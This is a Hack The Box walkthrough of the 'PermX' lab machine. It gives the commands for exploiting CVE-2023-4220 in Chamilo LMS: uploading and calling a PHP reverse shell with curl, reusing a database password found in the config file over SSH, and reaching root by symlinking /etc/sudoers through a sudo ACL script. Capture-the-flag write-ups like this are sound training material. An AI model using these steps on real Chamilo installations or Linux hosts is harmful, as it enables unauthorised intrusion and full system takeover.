# HTB Walkthrough — Machine: PermX

**Target IP:** `10.10.11.23`  
**Author:** Miguel Reis  
**Difficulty:** Easy  
**OS:** Linux

![[PermX-20240713000202915.png]]

## Subdomain Enumeration


```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://permx.htb/" -H 'host: FUZZ.permx.htb' -fc 302
```

http://lms.permx.htb/index.php

We find [CVE-2023-4220](https://starlabs.sg/advisories/23/23-4220/)

We confirm that `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/` directory exists

We use a php reverse shell to access the server:


```
curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```


```
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'
```

Then we use:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

to spawn a interactive shell, now we need to do privilege escalation


On the file: `/var/www/chamilo/app/config/configuration.php` we find:
 

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;

```

We then can use:

`ssh mtz@10.10.11.23` and use the password to login

We have sudo access to run `/opt/acl.sh`, which is a bash script with the purpose of modifying file permissions and access control lists (ACLs) for specified files and directories, enabling specific users or groups to gain additional read, write, or execute permissions beyond their default access
with the limitation that it must be a file and it needs to be on the /home/mtz directory

we then create a symbolic link to /etc/sudoers file to give our user sudo permissions ith the command:

```
ln -s /etc/sudoers link
```


And give permissions to that link:

```
sudo /opt/acl.sh mtz rwx /home/mtz/link 
```

we then can nano the file and give priviliges to mtz:
`mtz    ALL=(ALL:ALL) ALL`

For some reason we must `ctrl+x` to exit click `y` to indicate we want to save the file and click `ENTER` to maintain the name

When i pressed `ctrl+s` and then `ctrl+x` it didnt work and i needed to redo the link

we can then switch to root: `sudo su` and the flag is on `/root` as usual.

